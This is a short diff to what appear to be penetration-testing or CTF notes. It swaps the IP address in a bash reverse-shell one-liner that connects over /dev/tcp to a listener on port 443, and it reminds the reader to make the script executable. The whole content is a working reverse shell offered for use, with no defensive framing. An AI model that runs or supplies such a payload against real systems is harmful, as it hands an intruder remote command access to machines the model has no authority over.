@@ -2,7 +2,7 @@
 ```sh
 #!/bin/bash
 
-bash -i >& /dev/tcp/10.18.21.236/443 0>&1
+bash -i >& /dev/tcp/10.21.31.111/443 0>&1
 ```
 
 <font color="red">Don't forget to make sure your script file is executable `chmod +x [script]`
